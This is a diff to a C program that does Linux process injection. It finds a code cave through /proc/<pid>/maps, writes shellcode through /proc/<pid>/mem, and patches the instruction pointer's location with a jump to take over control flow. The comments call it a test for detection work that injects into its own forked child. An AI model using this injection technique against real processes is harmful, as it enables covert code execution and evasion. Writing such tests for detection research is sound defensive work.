@@ -8,6 +8,7 @@
 #include <elf.h>
 
 unsigned char shellcode[] = {
+    // --- start: ---
     0x48, 0x83, 0xe4, 0xf0,        // and rsp, -16        (stack alignment)
     0xeb, 0x26,                    // jmp short get_path
     // --- back: ---
@@ -28,22 +29,22 @@ unsigned char shellcode[] = {
     0x70, 0x77, 0x6e, 0x65, 0x64,  // "pwned"
     0x00                          
 };
-unsigned int shellcode_len = 60;
+unsigned int shellcode_len = sizeof(shellcode);
 
 #define CHUNK_SIZE (size_t)sysconf(_SC_PAGESIZE)
 #define MIN(a, b) (((a) < (b)) ? (a) : (b))
 #define MAX_LOOPS 100
+#define JUMPER_LEN 14
 
 pid_t create_victim_child_process() {
     pid_t pid = fork();
     if (pid < 0) {
         return 0;
     } else if (pid == 0) {
-        printf("[Victim Process]:  PID = %d\n", getpid());
         sleep(2);
         exit(0);
     }
-    sleep(0.2);
+    usleep(200000);
     return pid;
 }
 
@@ -108,7 +109,7 @@ long get_reg(pid_t pid, const char* reg) {
     int fd = open(path, O_RDONLY);
     if (fd < 0) return -1;
 
-    //try to read registers until theu became available
+    //try to read registers until they become available
     ssize_t bytesRead;
     int i=0;
     while (i < MAX_LOOPS && (bytesRead = pread(fd, buffer, sizeof(buffer) - 1, 0)) > 0) {
@@ -119,6 +120,7 @@ long get_reg(pid_t pid, const char* reg) {
     }
 
     close(fd);
+    if (bytesRead <= 0) return -1;
     buffer[bytesRead] = '\0';
 
     long syscall, rdi, rsi, rdx, r10, r8, r9, rsp, rip;
@@ -215,12 +217,12 @@ long find_code_cave(pid_t pid, size_t shellcode_len) {
 }
 
 void create_jumper(uintptr_t payload_address, unsigned char *jumper_buffer) {
-    jumper_buffer[0] = 0x90;
-    jumper_buffer[1] = 0x90;
-    jumper_buffer[2] = 0x48;
+    jumper_buffer[0] = 0x90;    // NOP, NOP to understand why look for the [!] point in the description
+    jumper_buffer[1] = 0x90;    
+    jumper_buffer[2] = 0x48;    // 48 B8 <addr> -> movabs rax, <addr>
     jumper_buffer[3] = 0xB8;
     memcpy(&jumper_buffer[4], &payload_address, sizeof(uintptr_t));
-    jumper_buffer[12] = 0xFF;
+    jumper_buffer[12] = 0xFF;   // FF E0 -> jmp rax
     jumper_buffer[13] = 0xE0;
 }
 
@@ -245,12 +247,13 @@ int main(int argc, char *argv[]) {
         fprintf(stderr, "[-] Code cave not found\n");
         exit(1);
     }
-    printf("[+] Code cave found here: 0x%lx\n", target_address);
+    printf("[+] Code cave found at: 0x%lx\n", target_address);
 
     // write the payload in a executable region
     unsigned char CodeCave[shellcode_len];
-    read_mem(CodeCave, pid, target_address, shellcode_len);
-    printf("[+] Code Cave content before the injection: \n");
+    if (read_mem(CodeCave, pid, target_address, shellcode_len) != 0)
+        fprintf(stderr, "[!] Warning: failed to read memory\n");
+    printf("[+] Code Cave content before the overwrite: \n");
     print_mem(CodeCave, shellcode_len);
 
     if(write_in_mem(target_address, pid, shellcode, shellcode_len) != (ssize_t)shellcode_len) {
@@ -259,31 +262,31 @@ int main(int argc, char *argv[]) {
     }
     printf("[+] Payload written successfully\n");
 
-    read_mem(CodeCave, pid, target_address, shellcode_len);
-    printf("[+] Code Cave content after the injection: \n");
+    if (read_mem(CodeCave, pid, target_address, shellcode_len) != 0)
+        fprintf(stderr, "[!] Warning: failed to read memory\n");
+    printf("[+] Code Cave content after the overwrite: \n");
     print_mem(CodeCave, shellcode_len);
 
-    //overwrite the istruction pointer to execut the paylaod
-    int jumper_len = 14;
-    unsigned char jumper[jumper_len];
+    //overwrite the instruction pointer to execute the payload
+    unsigned char jumper[JUMPER_LEN];
 
-    unsigned char stack[jumper_len];
-    read_mem(stack, pid, instruction_pointer-2, jumper_len);
-    printf("[+] Memory around IP before the injection: \n");
-    print_mem(stack, jumper_len);
-    printf("\n");
+    unsigned char stack[16];
+    if (read_mem(stack, pid, instruction_pointer - 2, sizeof(stack)) != 0)
+        fprintf(stderr, "[!] Warning: failed to read memory\n");
+    printf("[+] Memory around IP before the overwrite: \n");
+    print_mem(stack, sizeof(stack));
 
     create_jumper(target_address, jumper);
-    if(write_in_mem(instruction_pointer - 2, pid, jumper, sizeof(jumper)) != sizeof(jumper)){
+    if(write_in_mem(instruction_pointer - 2, pid, jumper, sizeof(jumper)) != (ssize_t)sizeof(jumper)){
         fprintf(stderr, "[-] Failed to write the jumper\n");
         exit(1);
     }
     printf("[+] Jumper written successfully\n");
     
-    read_mem(stack, pid, instruction_pointer-2, jumper_len);
-    printf("[+] Memory around IP after the injection: \n");
-    print_mem(stack, jumper_len);
-    printf("\n");
+    if (read_mem(stack, pid, instruction_pointer - 2, sizeof(stack)) != 0)
+        fprintf(stderr, "[!] Warning: failed to read memory\n");
+    printf("[+] Memory around IP after the overwrite: \n");
+    print_mem(stack, sizeof(stack));
 
     printf("[+] Injection finished\n");
     exit(0);
@@ -291,10 +294,10 @@ int main(int argc, char *argv[]) {
 
 /**
  * This technique achieves control-flow hijacking via Code Patching.
- * It first identifies a code cave by scanning /proc/[pid]/maps
- * and writes the shellcode into it through /proc/[pid]/mem.
- * it locates the exact memory address the CPU is about to execute
- * (via the RIP register, gathered in the /proc/PID/syscall file)
+ * It first identifies a code cave by scanning /proc/<pid>/maps
+ * and writes the shellcode into it through /proc/<pid>/mem.
+ * It locates the exact memory address the CPU is about to execute
+ * (via the RIP register, read from the /proc/<pid>/syscall file)
  * and overwrites the instructions at that memory location
  * with an unconditional jump pointing to the shellcode address. 
  * 
@@ -304,15 +307,16 @@ int main(int argc, char *argv[]) {
  * To prevent crashes in cases where the process was not in a syscall,
  * a NOP sled (padding with 0x90) is prepended to the payload,
  * ensuring the execution flow safely slides into the shellcode regardless of the exact byte offset.
- * [!]: Keep in mind that this code would not strictly need to account for syscall restarts,
- * as the injection doesn't rely on that specific type of interruption.
- * However, I chose to include it to generalize the technique (and because it's cool).
+ * [!]: Strictly speaking, this technique does not require handling syscall restarts,
+ * since we are not interrupting the victim during a syscall. The NOP sled is included for generality
+ * (the same shellcode could be reused in scenarios where syscall restarting does occur)
+ * and as a defensive measure against off-by-a-few-bytes inaccuracies in the RIP read from /proc/<pid>/syscall.
  * 
  * Note: this test forks a child process to use as the injection target.
  * This allows the test to run on systems where ptrace_scope=1 (default on most Linux distributions),
  * where a process can only modify the memory of its own descendants.
  * This may differs from a real-world scenario where the attacker targets an arbitrary process,
- * but for the purpose of this test it preserves the detection-relevant behavior: the same syscalls and /proc/[pid]/mem
+ * but for the purpose of this test it preserves the detection-relevant behavior: the same syscalls and /proc/<pid>/mem
  * access patterns are generated regardless of the relationship between injector and target.
  * 
  * Injection inspired by Ori David in "The Definitive Guide to Linux Process Injection"
